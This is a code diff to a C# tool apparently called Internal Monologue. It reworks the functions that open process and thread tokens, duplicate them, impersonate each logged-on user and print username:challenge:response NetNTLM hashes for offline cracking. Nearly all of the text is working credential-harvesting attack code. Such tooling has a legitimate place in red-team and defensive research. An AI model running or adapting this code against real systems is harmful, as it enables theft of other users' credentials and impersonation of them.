@@ -172,112 +172,88 @@ namespace InternalMonologue
         //Retrieves the SID of a given token
         public static string GetLogonId(IntPtr token)
         {
-            int TokenInfLength = 0;
-            // first call gets lenght of TokenInformation
-            bool Result = GetTokenInformation(token, 2, IntPtr.Zero, TokenInfLength, out TokenInfLength);
-            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
-            Result = GetTokenInformation(token, 2, TokenInformation, TokenInfLength, out TokenInfLength);
-
-            if (!Result)
+            string SID = null;
+            try
             {
-                Marshal.FreeHGlobal(TokenInformation);
-                return string.Empty;
-            }
-
-            string retVal = string.Empty;
-            TOKEN_GROUPS groups = (TOKEN_GROUPS)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_GROUPS));
-            int sidAndAttrSize = Marshal.SizeOf(new SID_AND_ATTRIBUTES());
-            for (int i = 0; i < groups.GroupCount; i++)
-            {
-                SID_AND_ATTRIBUTES sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
-                    new IntPtr(TokenInformation.ToInt64() + i * sidAndAttrSize + IntPtr.Size), typeof(SID_AND_ATTRIBUTES));
-                if ((sidAndAttributes.Attributes & 0xC0000000) == 0xC0000000)
+                StringBuilder sb = new StringBuilder();
+                int TokenInfLength = 1024;
+                IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
+                Boolean Result = GetTokenInformation(token, 1, TokenInformation, TokenInfLength, out TokenInfLength);
+                if (Result)
                 {
-                    IntPtr pstr = IntPtr.Zero;
-                    ConvertSidToStringSid(sidAndAttributes.Sid, out pstr);
-                    retVal = Marshal.PtrToStringAuto(pstr);
-                    LocalFree(pstr);
-                    break;
-                }
-            }
+                    TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
 
-            Marshal.FreeHGlobal(TokenInformation);
-            return retVal;
+                    IntPtr pstr = IntPtr.Zero;
+                    Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
+                    SID = Marshal.PtrToStringAuto(pstr);
+                    LocalFree(pstr);
+                }
+
+                Marshal.FreeHGlobal(TokenInformation);
+
+                return SID;
+            }
+            catch (Exception e)
+            {
+                CloseHandle(token);
+                return null;
+            }
         }
 
         public static void HandleProcess(Process process, string challenge, bool verbose)
         {
-            string SID = null;
-
             try
             {
-                //Duplicate the token
                 var token = IntPtr.Zero;
                 var dupToken = IntPtr.Zero;
+                string SID = null;
 
-                if (OpenProcessToken(process.Handle, 0x0002, ref token))
+                if (OpenProcessToken(process.Handle, 0x0008, ref token))
                 {
-                    var sa = new SECURITY_ATTRIBUTES();
-                    sa.nLength = Marshal.SizeOf(sa);
-
-                    DuplicateTokenEx(
-                        token,
-                        0x0002 | 0x0008,
-                        ref sa,
-                        (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        (int)1,
-                        ref dupToken);
-
+                    //Get the SID of the token
+                    SID = GetLogonId(token);
                     CloseHandle(token);
 
-                    //Get the SID of the token
-                    try
+                    //Check if this user hasn't been handled yet
+                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                     {
-                        StringBuilder sb = new StringBuilder();
-                        int TokenInfLength = 1024;
-                        IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
-                        Boolean Result = GetTokenInformation(dupToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
-                        if (Result)
+                        if (OpenProcessToken(process.Handle, 0x0002, ref token))
                         {
-                            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
+                            var sa = new SECURITY_ATTRIBUTES();
+                            sa.nLength = Marshal.SizeOf(sa);
 
-                            IntPtr pstr = IntPtr.Zero;
-                            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
-                            SID = Marshal.PtrToStringAuto(pstr);
-                            LocalFree(pstr);
-                        }
+                            DuplicateTokenEx(
+                                token,
+                                0x0002 | 0x0008,
+                                ref sa,
+                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                                (int)1,
+                                ref dupToken);
 
-                        Marshal.FreeHGlobal(TokenInformation);
-                    }
-                    catch (Exception e)
-                    {
-                        CloseHandle(dupToken);
-                    }
-                }
+                            CloseHandle(token);
 
-                //Handle each available user only once
-                if (SID != null && authenticatedUsers.Contains(SID) == false)
-                {
-                    try
-                    {
-                        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
-                        {
-                            if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                            string result = ByteArrayToString(InternalMonologueForCurrentUser(challenge));
-                            //Ensure it is a valid response and not blank
-                            if (result != null && result.Length > 0)
+                            try
                             {
-                                Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge + ":" + result);
-                                authenticatedUsers.Add(SID);
+                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
+                                {
+                                    if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
+                                    string result = ByteArrayToString(InternalMonologueForCurrentUser(challenge));
+                                    //Ensure it is a valid response and not blank
+                                    if (result != null && result.Length > 0)
+                                    {
+                                        Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge + ":" + result);
+                                        authenticatedUsers.Add(SID);
+                                    }
+                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
+                                }
                             }
-                            else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
+                            catch (Exception e)
+                            { /*Does not need to do anything if it fails*/ }
+                            finally
+                            {
+                                CloseHandle(dupToken);
+                            }
                         }
-                    }
-                    catch (Exception e)
-                    { /*Does not need to do anything if it fails*/ }
-                    finally
-                    {
-                        CloseHandle(dupToken);
                     }
                 }
             }
@@ -287,10 +263,12 @@ namespace InternalMonologue
 
         public static void HandleThread(ProcessThread thread, string challenge, bool verbose)
         {
-            string SID = null;
-
             try
             {
+                var token = IntPtr.Zero;
+                var dupToken = IntPtr.Zero;
+                string SID = null;
+
                 //Try to get thread handle
                 var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));
 
@@ -300,78 +278,52 @@ namespace InternalMonologue
                     return;
                 }
 
-                //Duplicate thread token
-                var token = IntPtr.Zero;
-                var dupToken = IntPtr.Zero;
-                if (OpenThreadToken(handle, 0x0002, true, ref token))
+                if (OpenThreadToken(handle, 0x0008, true, ref token))
                 {
-                    var sa = new SECURITY_ATTRIBUTES();
-                    sa.nLength = Marshal.SizeOf(sa);
-
-                    DuplicateTokenEx(
-                        token,
-                        0x0002 | 0x0008,
-                        ref sa,
-                        (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        (int)1,
-                        ref dupToken);
-
+                    //Get the SID of the token
+                    SID = GetLogonId(token);
                     CloseHandle(token);
 
-                    try
+                    //Check if this user hasn't been handled yet
+                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                     {
-                        //Get the SID of the token
-                        StringBuilder sb = new StringBuilder();
-                        int TokenInfLength = 1024;
-                        IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
-                        Boolean Result = GetTokenInformation(dupToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
-                        if (Result)
+                        if (OpenThreadToken(handle, 0x0002, true, ref token))
                         {
-                            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
+                            var sa = new SECURITY_ATTRIBUTES();
+                            sa.nLength = Marshal.SizeOf(sa);
 
-                            IntPtr pstr = IntPtr.Zero;
-                            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
-                            SID = Marshal.PtrToStringAuto(pstr);
-                            LocalFree(pstr);
-                        }
+                            DuplicateTokenEx(
+                                token,
+                                0x0002 | 0x0008,
+                                ref sa,
+                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                                (int)1,
+                                ref dupToken);
 
-                        Marshal.FreeHGlobal(TokenInformation);
-                    }
-                    catch (Exception e)
-                    {
-                        CloseHandle(dupToken);
-                        CloseHandle(handle);
-                    }
-                }
+                            CloseHandle(token);
 
-                //Handle each available user only once
-                if (SID != null && authenticatedUsers.Contains(SID) == false)
-                {
-                    try
-                    {
-                        //Impersonate user
-                        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
-                        {
-                            if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                            string result = ByteArrayToString(InternalMonologueForCurrentUser(challenge));
-                            //Ensure there is a valid response and not a blank
-                            if (result != null && result.Length > 0)
+                            try
                             {
-                                Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge + ":" + result);
-                                authenticatedUsers.Add(SID);
+                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
+                                {
+                                    if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
+                                    string result = ByteArrayToString(InternalMonologueForCurrentUser(challenge));
+                                    //Ensure it is a valid response and not blank
+                                    if (result != null && result.Length > 0)
+                                    {
+                                        Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":" + challenge + ":" + result);
+                                        authenticatedUsers.Add(SID);
+                                    }
+                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
+                                }
                             }
-                            else if (verbose == true)
+                            catch (Exception e)
+                            { /*Does not need to do anything if it fails*/ }
+                            finally
                             {
-                                Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name);
+                                CloseHandle(dupToken);
                             }
                         }
-                    }
-                    catch (Exception e)
-                    { /*Does not need to do anything if it fails*/ }
-                    finally
-                    {
-                        CloseHandle(dupToken);
-                        CloseHandle(handle);
                     }
                 }
             }
